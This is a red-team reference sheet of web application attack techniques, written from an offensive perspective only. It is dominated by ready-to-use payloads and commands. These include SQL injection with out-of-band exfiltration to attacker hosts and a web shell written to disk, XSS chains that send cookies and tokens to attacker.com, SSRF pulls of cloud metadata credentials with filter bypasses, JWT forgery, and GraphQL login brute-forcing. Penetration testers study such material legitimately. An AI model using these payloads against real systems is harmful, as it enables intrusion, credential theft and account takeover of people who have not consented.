# Web Application Attack Techniques — Red Team Reference
> Current techniques (2023–2025). Offensive perspective only. For penetration testing engagements.

---

## 1. Advanced SQL Injection

### What It Is
SQL injection exploits unsanitized input that reaches a SQL interpreter. Advanced techniques go beyond simple `' OR 1=1--` to extract data from applications that return no visible query output, exfiltrate data out-of-band, abuse stored procedures, and evade WAF filtering.

### How to Find It During an Engagement
- Inject `'`, `''`, `;--`, `/*`, `)` into every parameter — observe errors, behavioral differences, response time changes
- Compare responses between `1=1` (true) and `1=2` (false) — different content length = boolean blind
- Inject `' AND SLEEP(5)--` — response delay confirms time-based blind
- Look for parameters passed to stored procedures (user registration, profile updates) — potential second-order sinks
- Test JSON/XML body parameters, HTTP headers (User-Agent, X-Forwarded-For, Referer), cookies

### Blind Boolean-Based
Application returns different responses for true/false conditions — no data in output.

```sql
-- True condition (returns normal page)
' AND 1=1--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--

-- False condition (returns empty/error page)
' AND 1=2--
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='z'--

-- Extract DB version char by char
' AND SUBSTRING(@@version,1,1)='5'--
' AND ASCII(SUBSTRING(@@version,1,1))>52--   -- binary search
```

### Blind Time-Based
No boolean difference visible — rely on deliberate delays.

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')>0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--
```

### Out-of-Band (OOB) — DNS
No response needed — data exfiltrated via DNS lookup. Requires network egress.

```sql
-- MSSQL (xp_dirtree — most reliable OOB vector on MSSQL)
'; EXEC master..xp_dirtree '//attacker-burp-collab.net/a'--
'; EXEC master..xp_fileexist '//attacker.net/'+@@version+'/a'--

-- MySQL (requires FILE privilege)
' AND LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.net\\a'))--
' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.net\\a'))--

-- PostgreSQL (via copy to program — requires superuser)
'; COPY (SELECT '') TO PROGRAM 'nslookup '+current_user+'.attacker.net'--

-- Oracle (UTL_HTTP)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.net/'||(SELECT password FROM users WHERE rownum=1)) FROM dual--
' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE rownum=1)||'.attacker.net') FROM dual--
```

### Out-of-Band (OOB) — HTTP
```sql
-- MSSQL (xp_cmdshell — if enabled)
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker.net/$(whoami)"'--

-- MySQL via INTO OUTFILE (needs writable web root)
' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'--

-- PostgreSQL COPY TO PROGRAM
'; COPY (SELECT current_user) TO PROGRAM 'curl http://attacker.net/?u=$(cat /etc/passwd|base64)'--
```

### Second-Order Injection
Payload stored safely in DB, executes later when another query uses it without sanitization.

**Scenario:** Registration stores `admin'--` as username. Password change function runs:
```sql
UPDATE users SET password='newpass' WHERE username='$username'
-- Becomes: UPDATE users SET password='newpass' WHERE username='admin'--'
-- Changes admin's password instead of the attacker's
```

**Finding second-order:** Register with SQLi payloads in name/email fields. Trigger features that use that data (profile edits, searches, reports). Monitor for behavioral differences.

### NoSQL Injection — MongoDB
MongoDB operators injected via JSON body or query parameters.

```
# Operator injection — bypass authentication
POST /login HTTP/1.1
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$ne": "invalid"}}

# $where JavaScript injection
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
{"$where": "sleep(5000) || true"}

# URL parameter injection
GET /users?username[$ne]=&password[$ne]=
GET /users?username[$regex]=.*&password[$ne]=x
GET /users?username[$gt]=&password[$ne]=

# Array injection for logic bypass
POST /login
username[]=admin&password[]=anything   (PHP/Node apps parsing arrays)
```

**Tool: NoSQLMap**
```bash
python nosqlmap.py --attack 1 --uri http://target.com/login
python nosqlmap.py --attack 2 --uri http://target.com/login --db admin
```

### WAF Bypass Techniques

**Comment injection:**
```sql
SELECT/*bypass*/password/**/FROM/**/users
SE/**/LECT password FR/**/OM users
```

**Case variation:**
```sql
SeLeCt pAsSwOrD fRoM uSeRs
```

**URL encoding / double encoding:**
```
%27 OR %271%27=%271       (single quote encoded)
%2527                      (double-encoded)
%u0027                     (Unicode encoding)
```

**Keyword substitution:**
```sql
UNION ALL SELECT          (instead of UNION SELECT)
UNION%0ASELECT            (newline between keywords)
UN/**/ION SEL/**/ECT
```

**Chunked Transfer Encoding** — Split request body in chunks to desync WAF inspection:
```
Transfer-Encoding: chunked

5\r\n
' OR \r\n
3\r\n
1=1\r\n
0\r\n
```

**HPP (HTTP Parameter Pollution):**
```
?id=1&id=2 UNION SELECT...
```

### sqlmap Commands

```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --dbs

# POST request
sqlmap -u "https://target.com/login" --data="user=admin&pass=test" --dbs

# With cookie auth
sqlmap -u "https://target.com/profile?id=1" --cookie="session=abc123" --level=5 --risk=3

# Time-based (when boolean blind fails)
sqlmap -u "https://target.com/?id=1" --technique=T --time-sec=5

# OOB exfiltration via DNS (Burp Collaborator)
sqlmap -u "https://target.com/?id=1" --dns-domain=attacker.burpcollaborator.net

# WAF bypass with tamper scripts
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,between,randomcase
sqlmap -u "https://target.com/?id=1" --tamper=charencode,unmagicquotes
sqlmap -u "https://target.com/?id=1" --tamper=space2mssqlblank,charunicodeencode --dbms=mssql

# Most useful tamper scripts for WAF bypass
# space2comment      → replaces spaces with /**/
# between            → replaces > with BETWEEN x AND y
# randomcase         → randomizes keyword case
# charencode         → URL-encodes characters
# charunicodeencode  → Unicode-encodes characters
# equaltolike        → replaces = with LIKE
# greatest           → replaces > with GREATEST()
# space2mssqlblank   → replaces spaces with MSSQL-specific blanks
# apostrophenullencode → replaces ' with %00%27
# halfversionedmorekeywords → MySQL version comment injection
# nonrecursivereplacement → double-encode for recursive WAF bypass

# Dump specific table
sqlmap -u "https://target.com/?id=1" --tamper=space2comment -D webapp -T users --dump

# Second-order (specify injection point and second request)
sqlmap -u "https://target.com/register" --data="user=INJECT*&pass=x" --second-url="https://target.com/profile"

# Custom header injection
sqlmap -u "https://target.com/" -H "X-Forwarded-For: *" --level=5

# Suffix/prefix for breaking out of context
sqlmap -u "https://target.com/?id=1" --prefix="'" --suffix="--"
```

---

## 2. XSS (Cross-Site Scripting)

### What It Is
XSS executes attacker-controlled JavaScript in a victim's browser context. Advanced vectors target DOM manipulation sinks, bypass Content Security Policy, exploit parser differentials in mutation, and chain to account takeover.

### How to Find It During an Engagement
- Map all reflection points: URL params, JSON responses, DOM sources, postMessage handlers
- Check `document.location`, `document.URL`, `document.referrer`, `location.hash` as DOM sources
- Review JavaScript for innerHTML, `document.write()`, `eval()`, `setTimeout()` — these are sinks
- Test JSON responses for reflected values without proper content-type headers
- Check for `postMessage` event listeners that use `eval` or `innerHTML`
- Use browser DevTools → Sources → search for reflection of your input

### DOM-Based XSS

Sources (user-controlled input reaching the DOM):
```javascript
document.URL / document.location / location.href / location.hash
location.search / location.pathname
document.referrer
window.name
document.cookie
localStorage / sessionStorage
postMessage events
WebSocket data
```

Sinks (dangerous DOM methods/properties):
```javascript
// Direct execution
eval()
setTimeout("userInput", 0)
setInterval("userInput", 0)
new Function("userInput")

// DOM injection
element.innerHTML = userInput
element.outerHTML = userInput
document.write(userInput)
document.writeln(userInput)

// Script src
element.src = userInput
element.href = userInput  (in <a> tags)

// jQuery
$(userInput)
$(".class").html(userInput)
$(".class").append(userInput)
```

**Example — hash-based DOM XSS:**
```
https://target.com/page#<img src=x onerror=alert(1)>
https://target.com/search?q=<script>alert(1)</script>

# If jQuery is used:
$(location.hash)   →  $("#<img src=x onerror=alert(1)>")
```

**postMessage DOM XSS:**
```javascript
// Vulnerable listener
window.addEventListener('message', function(e) {
    document.getElementById('output').innerHTML = e.data;
});

// Exploit from attacker's page
<iframe src="https://target.com/vulnerable-page"></iframe>
<script>
  frames[0].postMessage('<img src=x onerror=alert(document.cookie)>', '*');
</script>
```

### Mutation XSS (mXSS)

The browser's HTML parser mutates the injected HTML before it reaches the DOM — the mutation itself creates an XSS vector that the sanitizer never saw. Exploits discrepancies between sanitizers and browser parsing.

**Classic mXSS payload (DOMPurify bypass variants — test current version):**
```html
<!-- Namespace confusion — MathML/SVG parser differentials -->
<math><mtext></mtext><mglyph><svg><mtext></mtext><textarea><path id="</textarea><img onerror=alert(1) src>">

<!-- noscript parser trick (if noscript content inserted into DOM differently) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Table parsing mutation -->
<table><tbody><tr><td><form><input></td></tr></form></tbody></table>

<!-- Template tag -->
<template><img src=x onerror=alert(1)></template>

<!-- Obsolete elements that trigger re-parsing -->
<listing><img src=x onerror=alert(1)></listing>
```

**mXSS testing approach:**
1. Submit payload → check what the sanitizer outputs → check what the browser actually renders
2. Use `MutationObserver` in console to watch what gets inserted
3. DOMPurify < 3.0.6 had several bypasses — always test current version

### CSP Bypass Techniques

**Scenario 1: JSONP endpoint on whitelisted domain**
```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com

# If trusted-cdn.com has a JSONP endpoint:
<script src="https://trusted-cdn.com/jsonp?callback=alert(1)//"></script>
<script src="https://trusted-cdn.com/api?cb=alert(document.cookie)//"></script>

# Common JSONP endpoints on popular CDNs:
# accounts.google.com/o/oauth2/revoke?token=anything → callback param
# gstaticadssl.com various endpoints
```

**Scenario 2: Angular template injection (when Angular on whitelisted origin)**
```
# CSP allows https://target.com which uses Angular 1.x
<script src="https://target.com/angular.js"></script>
<div ng-app>{{constructor.constructor('alert(1)')()}}</div>

# Angular 1.x sandbox escape payloads:
{{$on.constructor('alert(1)')()}}
{{[].pop.constructor('alert(1)')()}}
```

**Scenario 3: Trusted domain hosts open redirect → script load**
```
# If CSP has: script-src https://trusted.com
# And trusted.com has open redirect:
<script src="https://trusted.com/redirect?url=https://attacker.com/xss.js"></script>
```

**Scenario 4: `unsafe-inline` with nonce — nonce predictability**
```
# If nonce is predictable or reused:
<script nonce="knownNonce">alert(1)</script>
```

**Scenario 5: `base-uri` not set — base tag injection**
```html
<!-- Inject a <base> tag to hijack relative script loads -->
<base href="https://attacker.com/">
<!-- All relative URLs now load from attacker.com -->
```

**Scenario 6: `script-src 'strict-dynamic'` abuse**
```javascript
// strict-dynamic propagates trust to scripts loaded by trusted scripts
// Find a script that dynamically loads other scripts — inject via their mechanism
```

**Scenario 7: CSS exfiltration (when script-src blocks JS but style-src is loose)**
```css
/* Exfiltrate via CSS attribute selectors — no JS needed */
input[value^="a"] { background: url('https://attacker.com/a') }
input[value^="b"] { background: url('https://attacker.com/b') }
/* Requires one character per request — use for CSRF token exfil */
```

### XSS to Account Takeover Chains

**Chain 1: Session cookie theft**
```javascript
// If HttpOnly is NOT set:
new Image().src='https://attacker.com/steal?c='+document.cookie;
fetch('https://attacker.com/steal?c='+btoa(document.cookie));
```

**Chain 2: CSRF token theft → action execution**
```javascript
// Steal CSRF token and perform privileged action
fetch('/account/settings')
  .then(r => r.text())
  .then(html => {
    var token = html.match(/name="csrf_token" value="([^"]+)"/)[1];
    return fetch('/account/email', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: 'email=attacker@evil.com&csrf_token='+token
    });
  });
```

**Chain 3: Password change via XSS**
```javascript
fetch('/account/password', {
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body: JSON.stringify({current_password:'', new_password:'hacked123'})
});
```

**Chain 4: OAuth token/code interception**
```javascript
// XSS on OAuth client → steal access token from URL fragment or storage
var token = location.hash.match(/access_token=([^&]+)/)[1];
fetch('https://attacker.com/steal?t='+token);
```

**Chain 5: localStorage / sessionStorage JWT theft**
```javascript
var jwt = localStorage.getItem('auth_token') || sessionStorage.getItem('jwt');
fetch('https://attacker.com/steal?jwt='+jwt);
```

### Dangling Markup Injection

Useful when CSP blocks script execution but allows image/link loads. Exfiltrates data via injected unclosed tags that "dangle" — the browser includes subsequent page content in the attribute value.

```html
<!-- Inject unclosed img tag — subsequent page content (including CSRF tokens) becomes part of src -->
"><img src='https://attacker.com/steal?data=

<!-- The browser fetches: https://attacker.com/steal?data=<rest of page including CSRF token> -->

<!-- Inject base64 encoding via style exfil -->
"><link rel=stylesheet href='https://attacker.com/steal?

<!-- Form action hijacking -->
"><form action='https://attacker.com/steal'>
```

**Target:** Anti-CSRF tokens, API keys, OAuth codes rendered in page HTML.

### XSS Tools

**XSStrike:**
```bash
# Basic scan
python xsstrike.py -u "https://target.com/search?q=test"

# POST data
python xsstrike.py -u "https://target.com/search" --data "q=test" -p q

# DOM XSS mode
python xsstrike.py -u "https://target.com/search?q=test" --dom

# Crawl entire site
python xsstrike.py -u "https://target.com" --crawl -l 3

# Fuzzing with custom payload file
python xsstrike.py -u "https://target.com/search?q=test" --fuzzer
```

**Dalfox:**
```bash
# Single URL
dalfox url "https://target.com/search?q=test"

# Pipe from file
dalfox file urls.txt

# With blind XSS callback
dalfox url "https://target.com/search?q=test" -b https://attacker.xss.ht

# Custom header
dalfox url "https://target.com/page" -H "Cookie: session=abc123"

# Crawl mode
dalfox url "https://target.com" --deep-domxss

# WAF bypass mode
dalfox url "https://target.com/search?q=test" --waf-evasion

# Output only confirmed findings
dalfox url "https://target.com/search?q=test" --only-poc
```

---

## 3. SSRF (Server-Side Request Forgery)

### What It Is
SSRF tricks the server into making HTTP requests to attacker-specified destinations — internal services, cloud metadata, localhost. The server's request bypasses network-level controls that would block the attacker directly. Critical in cloud environments where metadata endpoints expose credentials.

### How to Find It During an Engagement
- Any parameter that takes a URL: `url=`, `webhook=`, `callback=`, `fetch=`, `redirect=`, `load=`, `src=`, `href=`
- File import/export features (import from URL, PDF generation from URL, screenshot services)
- PDF generators that render HTML (often make outbound requests)
- Image proxy parameters
- OAuth redirect_uri / callback parameters
- XML parsers (XXE also triggers SSRF)
- Test with: `https://your-collaborator.net` — check for DNS/HTTP callback

### AWS Metadata — IMDSv1

```bash
# Direct curl from inside (or via SSRF):
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/hostname
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token — live AWS credentials

# User data (may contain secrets/passwords)
curl http://169.254.169.254/latest/user-data

# Via SSRF parameter:
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### AWS Metadata — IMDSv2 (Requires Token)

IMDSv2 requires a PUT request to obtain a session token first. Bypass via SSRF requires the SSRF to support custom headers AND PUT/POST methods, OR a redirect chain.

```bash
# Step 1: Obtain token (PUT request required)
curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
# Returns: TOKEN_VALUE

# Step 2: Use token
curl -H "X-aws-ec2-metadata-token: TOKEN_VALUE" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 bypass via SSRF (if SSRF supports redirect):
# Step 1: Host a redirect on attacker server:
#   HTTP/1.1 307 Temporary Redirect
#   Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
#   (307 preserves the method — so if app does PUT to your server, it follows to IMDSv2)

# IMDSv2 bypass via HTTP redirect in SSRF (most common real-world bypass):
# If SSRF follows 301/302 redirects AND makes the original request as PUT:
http://attacker.com/redirect → 302 → http://169.254.169.254/latest/api/token (may work if app doesn't validate)

# Alternative IMDSv2 SSRF: target services that proxy with headers
# Some internal services accept X-Forwarded-For or pass custom headers through

# Using obtained credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances --region us-east-1
```

### GCP Metadata

```bash
# GCP metadata requires specific header (Metadata-Flavor: Google)
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Key endpoints:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Alternative IP address (old GCP endpoint):
curl http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# SSRF bypass: If server doesn't add Metadata-Flavor header, header may be optional on old metadata servers
# or internal proxy may add it automatically
https://target.com/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Metadata

```bash
# Azure IMDS requires header: Metadata: true
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token for Azure API
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Key endpoints:
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"

# Via SSRF (if app passes headers):
https://target.com/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/
```

### Internal Network Scanning via SSRF

```bash
# Scan internal IP ranges — test for open ports by response differences
# Fast: use Burp Intruder or ffuf for range scanning

# Test private ranges:
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/
http://localhost/
http://127.0.0.1/

# Port scanning via SSRF (timing-based — slow for closed ports, fast for open)
http://127.0.0.1:22/     # SSH
http://127.0.0.1:3306/   # MySQL
http://127.0.0.1:6379/   # Redis
http://127.0.0.1:27017/  # MongoDB
http://127.0.0.1:8080/   # Common alt HTTP
http://127.0.0.1:9200/   # Elasticsearch

# Redis via gopher:// SSRF (command injection into Redis)
gopher://127.0.0.1:6379/_%0D%0ASET%20key%20value%0D%0A

# Elasticsearch query via SSRF
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/users/_search

# ffuf for internal host discovery via SSRF:
ffuf -u "https://target.com/fetch?url=http://10.0.0.FUZZ/" -w /usr/share/wordlists/raft-medium-words.txt -mc 200
```

### SSRF Filter Bypass Techniques

```bash
# Redirect chain (server follows redirects to internal)
http://attacker.com/redirect?to=http://169.254.169.254/

# IP encoding tricks
http://0177.0.0.1/          # Octal
http://0x7f000001/          # Hex
http://2130706433/          # Decimal
http://127.1/               # Shortened
http://127.0.0.1.nip.io/    # DNS resolves to 127.0.0.1

# IPv6
http://[::1]/               # IPv6 localhost
http://[::ffff:127.0.0.1]/  # IPv4-mapped IPv6

# URL parsing inconsistencies
http://attacker.com@169.254.169.254/   # @ trick
http://169.254.169.254#attacker.com    # Fragment
http://169.254.169.254.attacker.com/   # Subdomain confusion (if filter checks suffix)

# DNS rebinding
# Step 1: Register domain that resolves to attacker IP
# Step 2: After filter passes DNS check (gets attacker IP), TTL expires
# Step 3: Second DNS lookup returns 127.0.0.1 (rebind)
# Tool: singularity.me, rebinder.net

# Protocol handlers
file:///etc/passwd
dict://127.0.0.1:11211/stat    # Memcached
gopher://127.0.0.1:6379/_info  # Redis
tftp://attacker.com/shell

# Null byte / path traversal in URL
http://169.254.169.254%00.attacker.com/
http://169.254.169.254%2f%2fattacker.com/

# Double URL encoding
http://169.254.169.254%252F latest%252Fmeta-data
```

### Blind SSRF with DNS Callback

When SSRF does not return response — detect via out-of-band DNS/HTTP.

```bash
# Use Burp Collaborator, interactsh, or canarytokens.org
https://target.com/webhook?url=http://UNIQUE-ID.oastify.com/
https://target.com/import?source=http://UNIQUE-ID.canarytokens.com/

# interactsh-client (open source Burp Collaborator alternative)
interactsh-client -server https://interact.sh
# Gives you: xxxxxx.oast.me — use in SSRF payload

# Check callback:
interactsh-client -server https://interact.sh -token YOUR-TOKEN
# Will show DNS/HTTP hits with source IP

# Exfil path via DNS (if blind):
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Then to exfil the role name via DNS:
# Host server that reads URL path and re-requests:
# GET /ROLENAME → DNS lookup for ROLENAME.attacker.com
```

---

## 4. JWT Attacks

### What It Is
JSON Web Tokens (RFC 7519) are signed tokens used for authentication and authorization. Attacks exploit weak signing algorithms, misimplemented key handling, lack of signature validation, and header parameter injection. A compromised JWT equals arbitrary identity assumption.

### How to Find It During an Engagement
- Look for `Authorization: Bearer <token>` headers or `access_token` cookies
- Base64-decode the header and payload (split by `.`) — examine `alg`, `kid`, `jku`, `jwk` header fields
- Test with jwt.io for immediate decode
- Try replacing the token with a modified version — observe whether the server rejects it

### None Algorithm Attack

Server accepts unsigned tokens when `alg` is set to `none`.

```bash
# Original token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwicm9sZSI6InVzZXIifQ.SIGNATURE

# Step 1: Decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Step 2: Encode new header with none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Step 3: Modify payload (e.g., escalate role)
echo -n '{"sub":"user123","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'

# Step 4: Construct token (note trailing dot — empty signature)
HEADER.PAYLOAD.

# jwt_tool for none attack:
python3 jwt_tool.py TOKEN -X a
# -X a = alg:none attack
# Also tries: "None", "NONE", "nOnE" variations

# Variations to try:
# alg: "none"
# alg: "None"
# alg: "NONE"
# alg: "nOnE"
# alg: ""
```

### Weak HMAC Secret Brute Force

```bash
# hashcat — fastest, GPU-accelerated
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule

# john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

# jwt_tool brute force
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try first:
# secret, password, secret123, mysecret, jwt_secret, app_secret
# The app's domain name, the app's name

# After finding secret — forge any payload:
python3 jwt_tool.py TOKEN -T -S hs256 -p "found_secret"
# -T = tamper mode (modify claims)
# -S hs256 = sign with HS256
# -p = signing secret
```

### Algorithm Confusion (RS256 → HS256)

Server uses RS256 (asymmetric). The public key is accessible. Server code accepts both RS256 and HS256 and uses the public key as the HMAC secret when HS256 is submitted.

```bash
# Step 1: Obtain server's public key
# From JWKS endpoint: https://target.com/.well-known/jwks.json
# From JWT header if embedded (jwk parameter)
# From OpenSSL if the cert is accessible

# Step 2: Convert JWK to PEM
python3 jwt_tool.py TOKEN -V -jw jwks.json   # Verify and extract key

# Step 3: Forge HS256 token using public key as HMAC secret
python3 jwt_tool.py TOKEN -X k -pk public_key.pem
# -X k = key confusion attack
# -pk = path to public key PEM

# Manual approach:
# 1. Get public key in PEM format
# 2. Sign modified payload with public key as HMAC-SHA256 secret
import hmac, hashlib, base64
secret = open('public.pem', 'rb').read()
# construct header.payload
sig = hmac.new(secret, (header+'.'+payload).encode(), hashlib.sha256).digest()
token = header + '.' + payload + '.' + base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
```

### kid Header Injection

The `kid` (key ID) header parameter is used to look up which key to use for verification — if unsanitized, injectable.

```bash
# SQL injection in kid → force use of known value as key
# kid: "' UNION SELECT 'attackerkey' --"
# Server runs: SELECT key FROM keys WHERE kid='[injection]'
# Returns 'attackerkey' as the signing key

python3 jwt_tool.py TOKEN -I -hc kid -hv "' UNION SELECT 'attackerkey123' --" -S hs256 -p "attackerkey123"
# -I = inject mode
# -hc = header claim to modify
# -hv = new value for header claim
# -S hs256 = sign with HS256
# -p = the HMAC secret (must match what SQLi returns)

# Directory traversal in kid → /dev/null as key (empty HMAC secret)
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# File read: /dev/null = empty string = sign with empty secret

# File path traversal to known file:
python3 jwt_tool.py TOKEN -I -hc kid -hv "../../../proc/sys/kernel/randomize_va_space" -S hs256 -p "2"
# /proc/sys/kernel/randomize_va_space contains "2\n" — predictable
```

### Embedded JWK Attack

If server accepts the `jwk` header parameter and uses it to verify the signature, attacker generates their own keypair and embeds the public key in the header.

```bash
# jwt_tool generates keypair, embeds JWK, signs with private key:
python3 jwt_tool.py TOKEN -X s
# -X s = self-signed JWK injection
# Outputs forged token with embedded jwk header
```

### jku Header Injection

The `jku` (JWK Set URL) header parameter tells the server where to fetch the public key. If server fetches from attacker-controlled URL, attacker signs with their own private key.

```bash
# Step 1: Generate RSA keypair
openssl genrsa -out attacker.key 2048
openssl rsa -in attacker.key -pubout -out attacker.pub

# Step 2: Create JWKS file (host at attacker.com/jwks.json)
python3 jwt_tool.py TOKEN -X j -ju "https://attacker.com/jwks.json"
# jwt_tool generates JWKS automatically — host the output file
# -X j = jku injection
# -ju = jku URL

# Step 3: Modify payload claims and sign with attacker private key
python3 jwt_tool.py TOKEN -T -I -hc jku -hv "https://attacker.com/jwks.json" -S rs256 -pr attacker.key

# Filter bypasses for jku (server may check domain):
# https://target.com@attacker.com/jwks.json
# https://attacker.com#target.com
# https://target.com/redirect?url=https://attacker.com/jwks.json (open redirect)
```

### jwt_tool Quick Reference

```bash
# Decode and display any JWT
python3 jwt_tool.py TOKEN

# Verify signature with known secret
python3 jwt_tool.py TOKEN -S hs256 -p "mysecret"

# Tamper mode — interactive payload modification
python3 jwt_tool.py TOKEN -T

# All attacks in order of likelihood:
python3 jwt_tool.py TOKEN -M at    # Run all attack modes
# at = "All Tests" — tries none, alg confusion, etc.

# Scan for JWKS endpoint automatically
python3 jwt_tool.py TOKEN -J -ju https://target.com/.well-known/jwks.json

# Inject claim to existing token
python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p "secret"
# -pc = payload claim name
# -pv = payload claim value
```

---

## 5. GraphQL Security

### What It Is
GraphQL is a query language for APIs. Unlike REST, a single endpoint accepts arbitrary queries. Misconfigurations allow full schema enumeration, batching attacks for rate limit bypass, IDOR via predictable object IDs, and injection through unvalidated arguments.

### How to Find It During an Engagement
- Look for `/graphql`, `/api/graphql`, `/graphiql`, `/playground` endpoints
- POST requests with `{"query": "..."}` body
- Check for introspection support (the primary recon step)
- GraphQL endpoints often exist at multiple paths — enumerate with ffuf

### Introspection — Full Schema Extraction

```graphql
# Full introspection query — dumps entire schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } }
}

# Minimal introspection (when full is blocked):
{ __schema { types { name } } }
{ __type(name: "User") { fields { name type { name } } } }
```

**InQL Burp Extension:**
```bash
# InQL v4+ — from Burp extension UI or CLI
inql -t http://target.com/graphql        # Generate query templates
inql -t http://target.com/graphql --generate-html  # Browse in browser
inql scanner -t http://target.com/graphql --generate-cycles  # Find circular queries (DoS)

# graphql-voyager — visualize schema as interactive graph
# Point at introspection JSON, get visual relationship map
# Run: docker run -p 8080:80 graphql-voyager/graphql-voyager
```

### Field Suggestions (When Introspection Disabled)

GraphQL returns "Did you mean X?" suggestions for typos — reveals field names even without introspection.

```graphql
# Trigger suggestions:
{ usr { id } }
# Response: "Cannot query field 'usr' on type 'Query'. Did you mean 'user'?"

{ user { passw } }
# Response: "Cannot query field 'passw' on type 'User'. Did you mean 'password'?"
```

**Clairvoyance tool:**
```bash
# Brute-force schema via field suggestions
python3 clairvoyance.py -o schema.json https://target.com/graphql

# With auth token
python3 clairvoyance.py -o schema.json -H "Authorization: Bearer TOKEN" https://target.com/graphql

# Custom wordlist
python3 clairvoyance.py -o schema.json -w /path/to/wordlist.txt https://target.com/graphql

# Resume interrupted scan
python3 clairvoyance.py -o schema.json --input-schema partial-schema.json https://target.com/graphql
```

### Batching Attacks — Rate Limit Bypass

GraphQL allows multiple operations in a single request — bypasses rate limiting applied per-request.

```graphql
# Alias batching — multiple operations in one request:
mutation {
  attempt1: login(username: "admin", password: "password1") { token }
  attempt2: login(username: "admin", password: "password2") { token }
  attempt3: login(username: "admin", password: "password3") { token }
  attempt4: login(username: "admin", password: "password4") { token }
  # ... up to hundreds of attempts in one HTTP request
}

